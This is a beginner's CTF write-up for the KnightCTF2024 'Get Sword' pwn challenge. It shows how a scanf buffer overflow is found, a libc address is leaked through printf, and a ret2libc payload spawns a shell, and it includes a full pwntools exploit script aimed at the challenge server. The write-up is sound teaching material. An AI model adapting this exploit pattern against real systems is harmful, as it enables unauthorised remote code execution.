# KnightCTF2024 PWN - Get Sword

I am writing this writeup to share my thought process on how to tackle a PWN challenge for any beginners who want to learn PWN (I am a beginner myself). This took me way longer than expected to solve, probably because I havent joined a CTF in awhile due to exams.

NOTE : After reading the writeups I realised Im blind and did not see the win function :) What a way to overcomplicate things

## Initial Analysis

We are provided with an ELF file and we will first gather some information about the challenge we are dealing with.

```bash
└─$ file get_sword           
get_sword: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=4a9b260935bf815a04350e3bb9e0e4422f504b2a, for GNU/Linux 4.4.0, not stripped
```

Running the file command reveals that it is a 32 bit executable, and it is "not stripped" so the debugging symbols are not removed.

```bash
└─$ checksec --file=get_sword
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   35 Symbols        No    0               1               get_sword
```

Then, we will use checksec to identify the security protections on the binary. From the result above, there are no security protections enabled on the binary.

```
┌──(kali㉿kali)-[~/Downloads/getsword]
└─$ ./get_sword   
      />_________________________________
[#####[]_________________________________>
      \>
What do you want ? ?: a
You want, a
                                                                                                                                                             
┌──(kali㉿kali)-[~/Downloads/getsword]
└─$ ./get_sword
      />_________________________________
[#####[]_________________________________>
      \>
What do you want ? ?: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
You want, aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
zsh: segmentation fault  ./get_sword
```

Running the binary shows that it takes input from the user and crashes when we give it too much input.
Now, I am going to decompile the binary using Ghidra and look for the main function

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/c5e62d31-5865-4a26-8672-fa743842b809)

In the main function, only two functions are called which is printSword() and intro().

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a0ea7883-048f-40f4-bd71-eb9d3de75ba2)

The printSword() function only prints the banner which is not what we are looking for.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/26e383f7-f088-4a42-9e9c-ca006f3d1abd)

However, in the intro() function, we can obviously spot a buffer overflow vulnerability because scanf is using the "%s" format, which does not check how much input the user provides.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/349e3be6-9672-416a-8bc5-2b1fdff69317)

Taking a look at the stack alignment, we need to send 0x20 (32) bytes of data to overwrite the return address. 

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/796b91e9-fbe7-41d1-9f22-213166f2efa0)

The system function is also imported inside the program, which we will pass "/bin/sh" as an argument to spawn a shell on the remote server. This is a style of challenge called Ret2System.

So, we can overwrite the return address and call system function now, but how do we pass "/bin/sh" as an argument? We need to first leak libc addresses because there is a "/bin/sh" string inside libc.

## Exploit writing

```py
payload = b"A" * offset
payload += p32(exe.plt.printf)  # Calling the PLT of printf is the same as calling the function directly
payload += p32(exe.sym.main)   # Return to main after done
payload += p32(exe.got.printf)   # Passing the GOT entry of printf as argument to printf() to print out the content
```

So just like we discussed earlier, need to create a payload to overflow the return address. In a 64 bit executable, we will need to pass in arguments to the registers but thats not important here. Since this is a 32 bit executable, we need to call functions from the stack, and also pass in arguments from the stack. 

```
#--------------#
| AAAAAAAAAAAA |
#--------------#
|   FUNCTION   | <--- return address of the current function, we will overwrite this and call printf
#--------------#
|  RET ADDRESS | <--- return address of the new printf function that we are calling
#--------------#
|  ARGUMENT 1  | <--- arguments passed into the printf, which is exe.got.printf
#--------------#
```

This diagram shows how to call a function and pass arguments in x86. First we have the overflow "AAAAAAAA" until we reach the return address. Then we will overwrite this with FUNCTION (in our case, we will call the printf function). So, what we are doing is, we are calling the printf function to print the address of the function in libc. When printf function ends, we will make it jump back to the main function and start exploiting other things again

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/2b5f9583-5249-458c-b9a8-f4896bfc64c4)

Now we can calculate the base of libc with this

```python
p.sendlineafter(b"? ?: ", payload)
p.recvline()
woot = p.recv(4)
printf = u32(woot)
print("PRINTF : ", hex(printf))

libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

payload2  = offset * b'A'
payload2 += p32(libc.sym.system)
payload2 += 4 * b'B'
payload2 += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter(b"? ?: ", payload2)
p.interactive()
```

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/46e74a9f-5323-414f-8e9b-ca240766d9e5)

We have successfully spawned a shell on our local machine.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/58c9f700-2df7-47be-8f35-50a0848abd60)

But when doing this on the remote server, it fails. We can see from the output that the libc base address is weird, which means that it must be using a different libc version. If this is the case, we will need to leak a few addresses of functions in libc to find the version.

```python
payload = b"A" * offset
payload += p32(exe.plt.printf)
payload += p32(exe.sym.main)
payload += p32(exe.got.printf)

p.sendlineafter(b"? ?: ", payload)
p.recvline()
woot = p.recv(4)
printf = u32(woot)
print("PRINTF : ", hex(printf))


payload = b"A" * offset
payload += p32(exe.plt.printf)
payload += p32(exe.sym.main)
payload += p32(exe.got.fflush)

p.sendlineafter(b"? ?: ", payload)
p.recvline()
woot = p.recv(4)
fflush = u32(woot)
print("FFLUSH : ", hex(fflush))
```

This is the modified script to leak addresses.

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/2dacbffb-3f06-48cb-809e-ea4387454bb1)

With this we will go to https://libc.rip/ to find the libc version

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/ee7b8170-7a09-4af0-9c67-60ce54041b8a)

We got a few matches. Now, we can download one of it and test it. Move the file into the same directory as your exploit script and add this line

```python
libc = ELF('./libc-2.38-4-x86.so')
```

Now, we are ready to test it on the remote server

![image](https://github.com/fyrepaw13/fyrepaw13.github.io/assets/62428064/a07ec6fc-b8eb-4fc8-9aff-ba678f51459f)

We have successfully spawned a shell on the remote server

## Full Script

```python
#!/usr/bin/python
from pwn import *
import warnings

warnings.filterwarnings("ignore",category=BytesWarning)

exe = context.binary = ELF('./get_sword')
#libc = exe.libc
libc = ELF('./libc-2.38-4-x86.so')

host = "173.255.201.51"
port = 31337

gdb_script = '''

'''

offset = 32

#p = exe.process()
p = remote(host,port)
#p = gdb.debug('./', gdbscript = gdb_script)

payload = b"A" * offset
payload += p32(exe.plt.printf)
payload += p32(exe.sym.main)
payload += p32(exe.got.printf)

p.sendlineafter(b"? ?: ", payload)
p.recvline()
woot = p.recv(4)
printf = u32(woot)
print("PRINTF : ", hex(printf))

'''
payload = b"A" * offset
payload += p32(exe.plt.printf)
payload += p32(exe.sym.main)
payload += p32(exe.got.fflush)

p.sendlineafter(b"? ?: ", payload)
p.recvline()
woot = p.recv(4)
fflush = u32(woot)
print("FFLUSH : ", hex(fflush))
'''

libc.address = printf - libc.sym.printf
log.info('libc.address: ' + hex(libc.address))

payload2  = offset * b'A'
payload2 += p32(libc.sym.system)
payload2 += 4 * b'B'
payload2 += p32(libc.search(b'/bin/sh').__next__())

p.sendlineafter(b"? ?: ", payload2)
p.interactive()
```
